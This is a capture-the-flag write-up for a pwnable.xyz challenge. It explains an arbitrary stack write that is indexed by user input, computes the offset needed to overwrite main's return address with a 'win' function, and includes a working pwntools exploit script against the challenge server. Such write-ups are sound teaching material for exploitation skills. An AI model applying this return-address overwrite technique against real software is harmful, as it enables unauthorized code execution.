The meat of the challenge is this part of code:

![oob](https://i.imgur.com/4mT7e1A.png)  

`rcx` `rdx` and `rax` have our 3 arguments (with this order). 
As we can see, `rcx` and `rdx` are added and the result goes to: `[rbp+rax*8+var_60]`.  
Well, we have complete control of this address because `rax` contains our 3rd argument.  
That means:
* We control **what** we want to write (result = `rdx`+`rcx`)
* We control **where** to write it (`rax`)  
So, we can set the address of `win` function as the return address of `main`.

I set a breakpoint to see the `rbp` value when the result is stored (0x4008c3): **0x7fffffffdf50**  
I set a breakpoint at the ret address of main (0x40090b): **`rsp` = 0x7fffffffdf58**  
`0x7fffffffdf58 - 0x7fffffffdf50 = 0x8` which means if we can make this `[rbp+rax*8+var_60]` have the value `rbp + 0x8`,
we will have overwritten the ret address of main with `win`.  

Quick mafs there: 
> rax*8 - 0x60 =  8   
=> rax*8 - 96 =  8   
=> rax - 12 = 1  
=> rax = 13  

`payload = win_addr + 0 + 13`

```python
#!/usr/bin/python3
from pwn import *

ip = 'svc.pwnable.xyz'
port = 30002
filename = './challenge'

def pwn():
	r = remote(ip, port)
	e = ELF(filename, checksec=False)
	
	win = e.symbols['win']
	num1 = str(win) 
	num2 = ' 0'
	num3 = ' 13'
	payload = num1 + num2 + num3
	r.sendlineafter(':', payload)
	r.sendlineafter(':', 'random')
	r.recvuntil(': ')
	flag = r.recvall().decode('utf8')
	log.success(flag)
	
pwn()
```
